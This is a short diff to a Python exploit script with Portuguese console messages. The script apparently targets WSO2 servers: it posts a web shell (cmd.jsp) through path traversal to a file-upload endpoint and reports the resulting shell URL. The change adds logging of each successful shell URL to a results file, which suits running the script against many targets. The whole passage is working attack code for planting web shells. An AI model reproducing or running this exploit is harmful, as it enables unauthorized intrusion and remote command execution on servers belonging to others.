@@ -48,6 +48,8 @@ def exploit(url):
         resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp": shell})
         if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
             console.log(f"[green][<>] Explorado com sucesso, shell : [bold]{url}/authenticationendpoint/cmd.jsp[/bold][/green]")
+            with open('result.txt', 'a') as result:
+                result.write(f'\n[<>] Explorado com sucesso, shell : {url}/authenticationendpoint/cmd.jsp')
 
         else:
             console.log(f"\r[red][!] Falhou [/red] {url}")
